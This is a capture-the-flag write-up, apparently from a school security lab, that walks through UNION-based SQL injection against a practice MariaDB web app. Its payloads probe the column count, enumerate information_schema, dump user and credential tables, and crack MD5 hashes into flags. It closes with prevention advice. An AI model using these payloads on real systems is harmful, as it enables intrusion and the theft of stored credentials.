### Challenge

I tested several types of injections from this list: https://github.com/payloadbox/sql-injection-payload-list, and then I started trying UNION attacks.

Payload: `1 UNION SELECT 1`
Response: `The used SELECT statements have a different number of columns`

We have two columns:
```
1 UNION SELECT null,null

ID: 1 UNION SELECT null,null 
First name: one
Surname: me
ID: 1 UNION SELECT null,null 
First name: 
Surname:
```

We're likely dealing with `MySQL` because sleep(10) works. Indeed, a union select version adapted to MySQL and Microsoft works:

```
1 UNION SELECT NULL,@@version

ID: 1 UNION SELECT NULL,@@version 
First name: one
Surname: me
ID: 1 UNION SELECT NULL,@@version 
First name: 
Surname: 5.5.64-MariaDB-1ubuntu0.14.04.1
```

We know we have a database `Member_Sql_Injection` with a table `users`
```
1 UNION SELECT * from clauses

response : Table 'Member_Sql_Injection.clauses' doesn't exist
```

We can see there's a user flag:

```
1 UNION SELECT first_name,null FROM users

ID: 1 UNION SELECT first_name,null FROM users 
First name: one
Surname: me
ID: 1 UNION SELECT first_name,null FROM users 
First name: one
Surname: 
ID: 1 UNION SELECT first_name,null FROM users 
First name: two
Surname: 
ID: 1 UNION SELECT first_name,null FROM users 
First name: three
Surname: 
ID: 1 UNION SELECT first_name,null FROM users 
First name: Flag
Surname:
```

With the documentation of `information_schema.tables` for mariadb, we can discover all schemas, tables, and columns : https://mariadb.com/kb/en/information-schema-tables-table/

Some examples of payloads to obtain more information:

```SQL
1 UNION SELECT table_name, table_schema FROM information_schema.tables # get table name and schema
1 UNION SELECT table_name, table_rows FROM information_schema.tables # name and rows
1 UNION SELECT table_name, column_name FROM information_schema.columns # All colunms of all tables
```

```SQL
ID: 1 UNION SELECT table_name, column_name FROM information_schema.columns
First name: db_default
Surname: id
ID: 1 UNION SELECT table_name, column_name FROM information_schema.columns
First name: db_default
Surname: username
ID: 1 UNION SELECT table_name, column_name FROM information_schema.columns
First name: db_default
Surname: password
ID: 1 UNION SELECT table_name, column_name FROM information_schema.columns
First name: users
Surname: user_id
ID: 1 UNION SELECT table_name, column_name FROM information_schema.columns
First name: users
Surname: first_name
ID: 1 UNION SELECT table_name, column_name FROM information_schema.columns
First name: users
Surname: last_name
ID: 1 UNION SELECT table_name, column_name FROM information_schema.columns
First name: users
Surname: town
ID: 1 UNION SELECT table_name, column_name FROM information_schema.columns
First name: users
Surname: country
ID: 1 UNION SELECT table_name, column_name FROM information_schema.columns
First name: users
Surname: planet
ID: 1 UNION SELECT table_name, column_name FROM information_schema.columns
First name: users
Surname: Commentaire
ID: 1 UNION SELECT table_name, column_name FROM information_schema.columns
First name: users
Surname: countersign
ID: 1 UNION SELECT table_name, column_name FROM information_schema.columns
First name: guestbook
Surname: id_comment
ID: 1 UNION SELECT table_name, column_name FROM information_schema.columns
First name: guestbook
Surname: comment
ID: 1 UNION SELECT table_name, column_name FROM information_schema.columns
First name: guestbook
Surname: name
ID: 1 UNION SELECT table_name, column_name FROM information_schema.columns
First name: list_images
Surname: id
ID: 1 UNION SELECT table_name, column_name FROM information_schema.columns
First name: list_images
Surname: url
ID: 1 UNION SELECT table_name, column_name FROM information_schema.columns
First name: list_images
Surname: title
ID: 1 UNION SELECT table_name, column_name FROM information_schema.columns
First name: list_images
Surname: comment
ID: 1 UNION SELECT table_name, column_name FROM information_schema.columns
First name: vote_dbs
Surname: id_vote
ID: 1 UNION SELECT table_name, column_name FROM information_schema.columns
First name: vote_dbs
Surname: vote
ID: 1 UNION SELECT table_name, column_name FROM information_schema.columns
First name: vote_dbs
Surname: nb_vote
ID: 1 UNION SELECT table_name, column_name FROM information_schema.columns
First name: vote_dbs
Surname: subject
```

Okay, here's a summary:

We are in a MySQL database: 5.5.64-MariaDB-1ubuntu0.14.04.1
Database: Member_Sql_Injection

- DB: Member_Sql_Injection
- table: users

- DB: Member_Brute_Force ← Probably for another challenge
- table: db_default

- DB: Member_guestbook
- table: guestbook

- DB: Member_images
- table: list_images

- DB: vote_dbs
- table: survey


On the `users` table, you can retrieve the missing information and with this, the password!
```
ID: 1 UNION SELECT countersign, Commentaire FROM users
First name: 5ff9d0165b4f92b14994e5c685cdce28
Surname: Decrypt this password -> then lower all the characters. SHA256 on it and it's good!
```

Following the comment, we retrieve the password which turns out to be MD5, with the password being `FortyTwo`: https://md5.gromweb.com/?md5=5ff9d0165b4f92b14994e5c685cdce28
We lowercase the password: `fortytwo`

This results in:
```
10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5
```
And therefore, a 64-character string that is the flag!

Let's also grab the data of all the members just in case:

| user_id | first_name | last_name | town | country | planet | Commentaire | countersign |
| --- | --- | --- | --- | --- | --- | --- | --- |
| 1 | one | me | Paris | France | EARTH | Je pense, donc je suis | 2b3366bcfd44f540e630d4dc2b9b06d9 |
| 2 | two | me | Helsinki | Finlande | Earth | Aamu on iltaa viisaampi. | 60e9032c586fb422e2c16dee6286cf10 |
| 3 | three | me | Dublin | Irlande | Earth | Dublin is a city of stories and secrets. | e083b24a01c483437bcf4a9eea7c1b4d |
| 5 | Flag | GetThe | 42 | 42 | 42 | Decrypt this password -> then lower all the char. Sh256 on it and it's good ! | 5ff9d0165b4f92b14994e5c685cdce28 |

For `Member_Brute_Force` database and `db_default` table:
```sql
1 UNION SELECT {column1}, {column2} from Member_Brute_Force.db_default
```
| id | username | password |
| --- | --- | --- |
| 1 | root | 3bf1114a986ba87ed28fc1b5884fc2f8 |
| 1 | admin | 3bf1114a986ba87ed28fc1b5884fc2f8 |


Same for the others, you never know:

```sql
1 UNION SELECT id, url from Member_images.list_images
1 UNION SELECT title, comment from Member_images.list_images
```
| id | url | title | comment |
| --- | --- | --- | --- |
| 1 | https://fr.wikipedia.org/wiki/Programme_ | Nsa | An image about the NSA ! |
| 2 | https://fr.wikipedia.org/wiki/Fichier:42 | 42 ! | There is a number.. |
| 3 | https://fr.wikipedia.org/wiki/Logo_de_Go | Google | Google it ! |
| 4 | https://en.wikipedia.org/wiki/Earth#/med | Earth | Earth! |
| 5 | borntosec.ddns.net/images.png | Hack me ? | If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46 |

Well, another flag??
MD5: `albatroz` 
Converted back to SHA256: 

```
f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188
```

Nothing interesting in guestbook and survey.

### Vulnerability

A SQL injection attack consists of insertion or “injection” of a SQL query via the input data from the client to the application.

![sql-injection](https://github.com/Sleleu/darkly/assets/93100775/0abeaeef-5d7f-4a52-a018-3dc202c02d78)

> source: https://portswigger.net/web-security/sql-injection

When successful, this attack can allow cybercriminals to:

- Access sensitive data such as passwords, credit cards details, or personal user information
- Perform admin tasks on the database
- Alter database information
- Recover files from the system

### How to prevent SQLi

- The use of prepared statements with variable binding
  Here is an example :
  ```
  $sql = "SELECT `id` FROM `user` WHERE `email`=:email AND `password`=:password";
  $data = [
    'email'    => $_POST['email'],
    'password' => md5($_POST['password'])
  ];
  $prep = $conn->prepare($sql);
  $result = $prep->execute( $data );
  ```
  > source: https://www.codeur.com/tuto/php/se-proteger-injections-sql/
- Create an allowlist input validation
- Escaping All User Supplied Input
- Minimize the privileges assigned to every database account 

### Ressources
- https://crashtest-security.com/sql-injection-union/
- https://portswigger.net/web-security/sql-injection
- https://mariadb.com/kb/en/information-schema-tables-table/
- https://owasp.org/www-community/attacks/SQL_Injection
- https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html
